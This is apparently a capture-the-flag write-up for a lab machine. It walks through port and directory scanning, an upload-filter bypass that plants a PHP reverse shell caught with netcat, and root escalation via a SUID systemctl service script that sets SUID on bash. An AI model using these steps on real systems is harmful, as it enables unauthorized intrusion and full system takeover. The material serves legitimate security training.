# Vulnversity

- Run nmap for recon: `nmap -sC -sV -oN nmap/scan-2 10.10.162.176`
- A http server is running at 3333 and squid running at 3128
- Running gobuster on webserver: `gobuster dir -u http://10.10.162.176:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`
- Found a directory named `/internal`
- opening the directory, found a upload page in `index.php` while uploads the files to itself and stores the files in `/internal/uploads/`
- Tried upload php files with various extensions using `code.py`
- The server was open to accept `phtml` files so uploaded the `revshell.php`
- `nc -lvnp 1234` to start listening to the server.
- Exploit the server to find the binaries with SUID bit set. `find / -user root -perm -4000 -exec ls -ldb {} \;`
- Found `/bin/systemctl` with suid bit set.
- Go to `GTFObins` to find how to use systemctl to escalate privileges
- Execute the below bash script to set the SUID of `/bin/bash`

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
- Run `/bin/bash -p` to start bash shell while retaining permissions to get the root shell.